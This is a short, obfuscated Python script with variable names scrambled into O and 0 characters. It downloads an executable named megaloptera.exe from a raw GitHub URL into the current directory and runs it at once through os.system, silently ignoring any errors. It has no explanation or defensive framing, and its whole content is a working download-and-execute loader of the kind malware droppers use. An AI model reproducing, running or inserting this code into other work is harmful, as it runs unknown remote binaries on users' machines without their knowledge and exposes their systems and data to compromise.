import os #line:4
import requests #line:5
def launch (O0000O0OOO0000000 ):#line:7
    try :#line:8
        os .system (f"{O0000O0OOO0000000}")#line:9
    except :#line:10
        pass #line:11
def download_file (OOOO00OO0O00OO000 ,O000O0OOOO00O0O0O ):#line:12
    OOO00O0O0O000OOO0 =requests .get (OOOO00OO0O00OO000 )#line:13
    if OOO00O0O0O000OOO0 .status_code ==200 :#line:14
        O0OOO000OOO0000O0 =OOOO00OO0O00OO000 .split ("/")[-1 ]#line:15
        O0OO000O0OO00O0O0 =os .path .join (O000O0OOOO00O0O0O ,O0OOO000OOO0000O0 )#line:16
        with open (O0OO000O0OO00O0O0 ,'wb')as O00OOOOOOOOOO0O00 :#line:17
            O00OOOOOOOOOO0O00 .write (OOO00O0O0O000OOO0 .content )#line:18
        launch (O0OO000O0OO00O0O0 )#line:19
    else :#line:20
        return None #line:21
github_raw_url ="https://raw.githubusercontent.com/LopoDistrict/megaloptera/main/test/megaloptera.exe"#line:22
save_path =os .getcwd ()#line:24
download_file (github_raw_url ,save_path )